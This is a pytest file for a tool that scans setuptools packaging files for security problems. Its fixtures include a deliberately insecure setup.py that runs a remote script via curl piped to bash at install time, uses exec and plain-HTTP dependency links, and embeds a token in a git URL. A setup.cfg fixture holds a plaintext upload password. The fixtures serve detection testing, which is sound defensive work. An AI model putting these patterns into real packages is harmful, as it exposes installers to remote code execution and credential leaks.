"""Tests for SetuptoolsAnalyzer."""

from pathlib import Path

from devai.setuptools_analyzer import SetuptoolsAnalyzer, SetuptoolsFinding


INSECURE_SETUP_PY = """\
from setuptools import setup
import subprocess

version = {}
exec(open("version.py").read(), version)

setup(
    name="insecure-pkg",
    version=version["__version__"],
    install_requires=["requests>=2.0"],
    setup_requires=["setuptools>=40.0"],
    dependency_links=["http://insecure-pypi.example.com/simple"],
    download_url="http://download.example.com/pkg.tar.gz",
    install_requires=["git+https://user:secret-token@github.com/example/pkg.git@main"],
)

subprocess.run(["curl", "-s", "https://install.example.com/setup.sh", "|", "bash"])
"""

INSECURE_SETUP_CFG = """\
[metadata]
name = insecure-pkg
version = 1.0.0

[options]
install_requires =
    numpy=*
index_url = http://pypi.example.com/simple
trusted-host = pypi.example.com

[upload]
repository = http://upload.example.com/legacy/
password = super-secret-password
"""

INSECURE_PYPROJECT = """\
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "insecure-pkg"
version = "1.0.0"
dependencies = ["pytest>=7.0"]

[tool.setuptools.dynamic]
version = {attr = "pkg.__version__"}

[tool.setuptools]
package-dir = {"" = "src"}
"""

HARDENED_PYPROJECT = """\
[build-system]
requires = ["setuptools>=68", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "secure-pkg"
version = "1.0.0"
dependencies = ["requests==2.31.0"]

[tool.setuptools.packages.find]
where = ["src"]
"""


class TestSetuptoolsAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_ignores_non_setuptools_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "plain"\nversion = "1.0.0"\n',
            encoding="utf-8",
        )
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0

    def test_detects_setup_py_issues(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(INSECURE_SETUP_PY, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "exec_in_setup" in kinds
        assert "dependency_links" in kinds
        assert "insecure_http" in kinds
        assert "subprocess_in_setup" in kinds
        assert analyzer.health_score() < 100.0

    def test_detects_setup_cfg_issues(self, tmp_path: Path):
        (tmp_path / "setup.cfg").write_text(INSECURE_SETUP_CFG, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "dynamic_version" in kinds
        assert "insecure_http" in kinds
        assert "trusted_host" in kinds
        assert "hardcoded_secret" in kinds

    def test_detects_pyproject_issues(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "dynamic_version" in kinds

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high_medium = [f for f in findings if f.severity in ("high", "medium")]
        assert high_medium == []

    def test_finding_format(self):
        finding = SetuptoolsFinding(
            kind="insecure_http",
            severity="medium",
            message="test message",
            path="setup.cfg",
            lineno=3,
        )
        assert "setup.cfg:3" in finding.format()

    def test_parses_dependencies(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert len(analyzer.infos) == 1
        info = analyzer.infos[0]
        assert info.file_kind == "pyproject"

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "setup.py").write_text(INSECURE_SETUP_PY, encoding="utf-8")
        analyzer = SetuptoolsAnalyzer(str(tmp_path))
        assert "Setuptools configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Setuptools analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        analyzer = SetuptoolsAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "setuptools.build_meta" in config
        assert "TWINE_PASSWORD" in config

    def test_facade_setuptools_method(self):
        from devai.facade import DevAI

        dev = DevAI.mock()
        analyzer = dev.setuptools(".")
        assert isinstance(analyzer, SetuptoolsAnalyzer)
